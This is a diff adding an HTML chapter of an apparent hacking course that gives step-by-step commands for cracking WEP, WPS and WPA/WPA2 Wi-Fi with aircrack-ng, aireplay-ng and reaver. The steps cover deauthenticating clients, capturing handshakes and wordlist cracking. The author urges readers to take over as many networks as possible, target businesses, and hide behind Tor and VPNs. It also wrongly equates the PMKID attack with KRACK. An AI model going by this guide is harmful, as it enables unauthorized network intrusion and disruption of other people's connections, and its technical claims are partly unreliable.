@@ -1,0 +1,599 @@
+<head>
+ <title>
+  Act I
+ </title>
+ <meta content="application/xhtml+xml; charset=utf-8" http-equiv="content-type"/>
+ <link href="../css/style.css" media="screen" rel="stylesheet" type="text/css"/>
+</head>
+<body>
+ <div class="wrap background">
+  <div id="logo">
+   <div class="clear">
+   </div>
+   <div id="left">
+    <center>
+     <h1>
+      <a href="../1.html">
+       <font color="White">
+        Act I - Hack Wi-Fi
+       </font>
+      </a>
+     </h1>
+     <font color="blue">
+      We'll discuss original tools now for people who want to learn manual methods. If you have any issues with "airodump-ng" or any other commands simply skip down to the (1) tool that's recommended and utilize that. We'll go through everything to demonstrate it all but it's recommended to use the tool talked about at the end of this chapter.
+     </font>
+     <br/>
+     <br/>
+     <center>
+      <i>
+       NOTE items in
+       <font color="orange">
+        ORANGE
+       </font>
+       are items that you will need to change accordingly to reflect your machine.
+      </i>
+     </center>
+     <br/>
+     Make sure you kill any processes that can conflict with the programs you'll be using. This is good practice to run this command every time you plan on launching WiFi attacks to avoid problems. To see potential problems type:
+     <br/>
+     <font color="red">
+      sudo airmon-ng check
+     </font>
+     <br/>
+     This will show you the potential applications that can create problems.
+     <br/>
+     <br/>
+     <font color="red">
+      sudo airmon-ng check kill
+     </font>
+     <br/>
+     This will kill those applications that can create issues for us. Ensure this is done each time.
+     <br/>
+     <br/>
+     Ensure your Alfa network card is plugged into your Kali VM and type:
+     <br/>
+     <font color="red">
+      sudo iwconfig
+     </font>
+     <br/>
+     This will show you your wireless card interface.
+     <br/>
+     <br/>
+     Ensure your Alfa network card is plugged into your Kali VM and type:
+     <br/>
+     <font color="red">
+      sudo iwconfig
+     </font>
+     <br/>
+     This will show you your wireless card interface.
+     <br/>
+     <br/>
+     In the following examples of attacking WiFi networks it's assumed that you've placed your WiFi card into monitor already. To put your WiFi network card into monitor mode type:
+     <br/>
+     <font color="red">
+      sudo airmon-ng start
+     </font>
+     <font color="orange">
+      INTERFACE
+     </font>
+     <br/>
+     This will put your WiFi network card in monitor and tell you the interface to use moving forward(wlan0' wlan0mon' etc.)
+     <br/>
+     <br/>
+     <br/>
+     <br/>
+     <center>
+      <h2>
+       How to hack Wired Equivalent Privacy (WEP) networks
+      </h2>
+     </center>
+     <center>
+      Remember you must put your card into monitor mode and be using that interface.
+     </center>
+     <br/>
+     <br/>
+     <font color="red">
+      sudo airodump-ng -a
+     </font>
+     <font color="orange">
+      INTERFACE
+     </font>
+     <font color="red">
+      --encrypt WEP
+     </font>
+     <br/>
+     <br/>
+     This will show you only the WEP encrypted networks around you. Take note if there's no WEP networks around you will be shown nothing of fucking course! Hit CTRL+C when done
+     <br/>
+     <br/>
+     For this next example' "WEP-NETWORK" is the WiFI network we're targeting which is on channel 10 with a BSSID of "A3:D1:F4:E1:D5:B6"
+     <br/>
+     <br/>
+     Syntax:
+     <br/>
+     <font color="red">
+      sudo airodump-ng
+     </font>
+     <font color="orange">
+      INTERFACE
+     </font>
+     <font color="red">
+      --channel
+     </font>
+     <font color="orange">
+      #
+     </font>
+     <font color="red">
+      --bssid
+     </font>
+     <font color="orange">
+      MAC
+     </font>
+     <font color="red">
+      -w
+     </font>
+     <font color="orange">
+      OUTPUT_FILE
+     </font>
+     <br/>
+     <br/>
+     My examples:
+     <br/>
+     <font color="red">
+      sudo airodump-ng wlan0 --channel 10 --bssid A3:D1:F4:E1:D5:B6 -w WEP-NETWORK
+     </font>
+     <br/>
+     <br/>
+     While the above command is running open a new terminal window and type:
+     <br/>
+     <font color="red">
+      sudo aireplay-ng -1 1 -a
+     </font>
+     <font color="orange">
+      MAC INTERFACE
+     </font>
+     <br/>
+     <br/>
+     My example:
+     <br/>
+     <font color="red">
+      sudo aireplay-ng -1 1 -a A3:D1:F4:E1:D5:B6 wlan0
+     </font>
+     <br/>
+     <br/>
+     If a client is already associated to the AP then we can use their MAC address. If not' associate a fake client to the AP. Either way use one of the associated MAC addresses on the network. In a new Terminal window type:
+     <br/>
+     <font color="red">
+      sudo aireplay-ng
+     </font>
+     <font color="orange">
+      INTERFACE
+     </font>
+     <font color="red">
+      -3 -b
+     </font>
+     <font color="orange">
+      AP_of_MAC
+     </font>
+     <font color="red">
+      -c
+     </font>
+     <font color="orange">
+      FAKE_MAC
+     </font>
+     <br/>
+     <br/>
+     My example:
+     <br/>
+     <font color="red">
+      sudo aireplay-ng wlan0 -3 -b A3:D1:F4:E1:D5:B6 -c A1:B1:C1:D1:E1:F1
+     </font>
+     <br/>
+     This command will send ARP requests between the two generating new IVs along the way.
+     <br/>
+     <br/>
+     Once you have 50'000 - 100'000 IV's CTRL+C and attempt to crack the PCAP file. Wait until you have that many IVs before attempting this.
+     <br/>
+     <font color="red">
+      sudo aircrack-ng
+     </font>
+     <font color="orange">
+      WEP_FILE
+     </font>
+     <font color="red">
+      .cap -w /usr/share/wordlist/rockyou.txt
+     </font>
+     <br/>
+     You will now use that wordlist to cycle through each word to attempt to find the password. If successful' you'll see the password. There are times where it can appear oddly like:
+     <br/>
+     50:32:48:01:22
+     <br/>
+     <br/>
+     Remove the ":" when entering the password to get the password of:
+     <br/>
+     5032480122
+     <br/>
+     <br/>
+     The wordlist that you're using to crack passwords becomes vital as does the computing/graphical power of your computer when cracking passwords.
+     <br/>
+     <br/>
+     <br/>
+     <br/>
+     <center>
+      <h2>
+       How to hack WiFi PROTECTED SETUP (WPS) networks
+      </h2>
+     </center>
+     <center>
+      Remember you must put your card into monitor mode and be using that interface.
+     </center>
+     <br/>
+     <br/>
+     <font color="red">
+      sudo wash -i
+     </font>
+     <font color="orange">
+      INTERFACE
+     </font>
+     <br/>
+     Displays routers with WPS enabled in the area.
+     <br/>
+     <br/>
+     <font color="red">
+      sudo reaver -i
+     </font>
+     <font color="orange">
+      INTERFACE
+     </font>
+     <font color="red">
+      -c # -b
+     </font>
+     <font color="orange">
+      AP_MAC
+     </font>
+     <font color="red">
+      -vv
+     </font>
+     <br/>
+     <br/>
+     Example:
+     <br/>
+     <font color="red">
+      sudo reaver -i wlan0 -c 10 -b A2:B1:C3:D5:E2:F1 -vv
+     </font>
+     <br/>
+     <br/>
+     reaver uses a brute force attack against the WPS WiFi PIN. When the WPS pin is found the WPA PSK can be recovered in plaintext.
+     <br/>
+     <br/>
+     If you're having troubles associating to the AP or it continues to fail use (2) wireless card:
+     <br/>
+     <font color="red">
+      sudo aireplay-ng -1 30 -a
+     </font>
+     <font color="orange">
+      AP_MAC INTERFACE
+     </font>
+     <br/>
+     <br/>
+     <font color="red">
+      sudo reaver -N -A -i
+     </font>
+     <font color="orange">
+      INTERFACE
+     </font>
+     <font color="red">
+      -c
+     </font>
+     <font color="orange">
+      #
+     </font>
+     -b
+     <font color="orange">
+      AP_MAC
+     </font>
+     <font color="red">
+      -vv
+     </font>
+     <br/>
+     -N - Do not sent NACK messages when out of order
+     <br/>
+     -A - Do not associate to the AP
+     <br/>
+     <br/>
+     <font color="blue">
+      It should be noted that it's very likely you'll get locked out from brute force attempts against modern day routers or updated firmware when attacking with the reaver tool. That being said some lock you out for 60 seconds where others much more (5-10 minutes). If you get locked out for 60 seconds per attempt you should leave this one until last if your cracking the WiFi networks around you. If this network is somewhere around you or you definitely want on that network (corporation' business' etc.) it will take time but is feasible so don't give up and just let that shit run when you're at a library or coffee shop and may luck be on your side then. Take over as many networks as you can and use a different network every time you login and use Tor' VPS' and VPN's.
+     </font>
+     <br/>
+     <br/>
+     <br/>
+     <br/>
+     <center>
+      <h2>
+       How to hack WiFi Protected Access (WPA/WPA2) networks
+      </h2>
+     </center>
+     <center>
+      Remember you must put your card into monitor mode and be using that interface.
+     </center>
+     <br/>
+     <br/>
+     <center>
+      <b>
+       THERE MUST BE A CLIENT CONNECTED TO THE TARGET NETWORK FOR THIS ATTACK TO WORK
+      </b>
+     </center>
+     <br/>
+     <br/>
+     <font color="red">
+      sudo airodump-ng -a
+     </font>
+     <font color="orange">
+      INTERFACE
+     </font>
+     <font color="red">
+      --encrypt WPA
+     </font>
+     <br/>
+     -a = filtering any clients that are not associated. We want associated clients for this attack!
+     <br/>
+     <br/>
+     Once you've found the WiFi network you're going to target then:
+     <br/>
+     <font color="red">
+      sudo airodump-ng
+     </font>
+     <font color="orange">
+      INTERFACE
+     </font>
+     <font color="red">
+      --channel
+     </font>
+     <font color="orange">
+      #
+     </font>
+     <font color="red">
+      --bssid
+     </font>
+     <font color="orange">
+      MAC
+     </font>
+     <font color="red">
+      -w
+     </font>
+     <font color="orange">
+      SAVED_PCAP_NAME
+     </font>
+     <br/>
+     <br/>
+     This will begin saving packets to file.
+     <br/>
+     <br/>
+     We want to capture the 4-way handshake so we need a client to authenticate to the network or we need to de-authenticate a current client that will automatically re-connect when we de-authenticate it.
+     <br/>
+     <br/>
+     Open a new Terminal windows and disconnect a connected client
+     <br/>
+     <font color="red">
+      sudo aireplay-ng
+     </font>
+     <font color="orange">
+      INTERFACE
+     </font>
+     <font color="red">
+      --deauth 5 -b
+     </font>
+     <font color="orange">
+      MAC_Of_AP
+     </font>
+     <font color="red">
+      -c
+     </font>
+     <font color="orange">
+      Client_MAC
+     </font>
+     <br/>
+     --deauth 5 is a good start to send 5 deauth packets. Should this work then de-authenticating the whole AP is a good option as well.
+     <br/>
+     <br/>
+     MAC_Of_AP  = Mac address of AP targeting
+     <br/>
+     Client_MAC = A connected clients MAC address on the network
+     <br/>
+     <br/>
+     <font color="red">
+      sudo aireplay-ng
+     </font>
+     <font color="orange">
+      INTERFACE
+     </font>
+     <font color="red">
+      --deauth 15 -b
+     </font>
+     <font color="orange">
+      MAC_OF_AP
+     </font>
+     <br/>
+     This will de-authenticate everything associated to the AP being targeted.
+     <br/>
+     <br/>
+     Hopefully this obtained a handshake which will notify you in the top right hand side of the screen. Once you've obtained a handshake you may shut everything down. Now we want to use the saved .pcap file of the network we targeted. The .cap file is where the data that we're after is stored (4-way handshake).
+     <br/>
+     <br/>
+     Now let's crack the password with air-crack-ng.
+     <br/>
+     <font color="red">
+      sudo aircrack-ng
+     </font>
+     <font color="orange">
+      SAVED_PCAP_FILE
+     </font>
+     <font color="red">
+      -w
+     </font>
+     <font color="orange">
+      WORDLIST
+     </font>
+     <br/>
+     <br/>
+     If the password is in your wordlist it will be found!
+     <br/>
+     First' you should always have a basic wordlist that you'll use against the WiFi network you're trying to crack. There are plenty wordlists to use in Kali but there are many more out there to be utilized (a simple Google search away). Once a wordlist has been exhausted it's time to use other resources for cracking the password. It's better to outsource password cracking to online services that can utilize way more CPU/GPU power then you'll want to invest into buying yourself. Ultimately you could setup a separate desktop dedicated to password cracking' but this isn't really necessary or needed today and is fucking expensive.
+     <br/>
+     <br/>
+     Online WPA/WPA2 cracking services highly recommended:
+     <br/>
+     https://www.onlinehashcrack.com
+     <br/>
+     https://www.cloudcracker.com
+     <br/>
+     <br/>
+     In 2018 a bunch of researchers found a new vulnerability in WPA/WPA2 that does not require a 4-way handshake. This has assisted in the cracking of WPA/WPA2 networks and is known as a the PMKID attack or KRACK attack. In the next tool we'll be talking about includes all attacks automated for us.
+     <br/>
+     <br/>
+     <center>
+      <a href="24.html" style="text-decoration: none" target="_blank">
+       <font color="blue">
+        <b>
+         Click to Read - KRACK discussion on hashcat forums
+        </b>
+       </font>
+      </a>
+      <br/>
+     </center>
+     <br/>
+     We went over airodump-ng and reaver to familiarize yourself with the attacks and to understand how the attacks are implemented. I do recommend on using the recommended tool wifite2.
+     <br/>
+     <br/>
+     <br/>
+     <br/>
+     <div id="side">
+      <div class="boxtop">
+      </div>
+      <div class="box">
+       <center>
+        <span class="item">
+         <strong>
+          HackTown
+         </strong>
+         <br>
+          Hacking Courses
+         </br>
+        </span>
+       </center>
+      </div>
+      <div class="box">
+       <a href="Chapter-1.html">
+        <span class="item">
+         <strong>
+          Chapter 1
+         </strong>
+         <br>
+          Introduction
+         </br>
+        </span>
+       </a>
+      </div>
+      <div class="box">
+       <a href="Chapter-2.html">
+        <span class="item">
+         <strong>
+          Chapter 2
+         </strong>
+         <br>
+          Required Wi-Fi hardware
+         </br>
+        </span>
+       </a>
+      </div>
+      <div class="box">
+       <a href="Chapter-3.html">
+        <span class="item">
+         <strong>
+          Chapter 3
+         </strong>
+         <br>
+          Pre-requisites
+         </br>
+        </span>
+       </a>
+      </div>
+      <div class="box">
+       <a href="Chapter-4.html">
+        <span class="item">
+         <strong>
+          Chapter 4
+         </strong>
+         <br>
+          Hacking Wi-Fi Networks
+         </br>
+        </span>
+       </a>
+      </div>
+      <div class="box">
+       <a href="Chapter-5.html">
+        <span class="item">
+         <strong>
+          Chapter 5
+         </strong>
+         <br>
+          Unable to hack Wi-Fi
+         </br>
+        </span>
+       </a>
+      </div>
+      <div class="box">
+       <a href="Chapter-6.html">
+        <span class="item">
+         <strong>
+          Chapter 6
+         </strong>
+         <br>
+          Increase the POWER!
+         </br>
+        </span>
+       </a>
+      </div>
+      <div class="box">
+       <a href="Chapter-7.html">
+        <span class="item">
+         <strong>
+          Chapter 7
+         </strong>
+         <br>
+          Locating the Access Point (AP)
+         </br>
+        </span>
+       </a>
+      </div>
+      <div class="box">
+       <a href="Chapter-8.html">
+        <span class="item">
+         <strong>
+          Chapter 8
+         </strong>
+         <br>
+          WPA3 Networks
+         </br>
+        </span>
+       </a>
+      </div>
+      <div class="box">
+       <a href="Conclusion.html">
+        <span class="item">
+         <strong>
+          Conclusion
+         </strong>
+         <br>
+         </br>
+        </span>
+       </a>
+      </div>
+      <div class="boxbottom">
+      </div>
+     </div>
+    </center>
+   </div>
+  </div>
+ </div>
+</body>
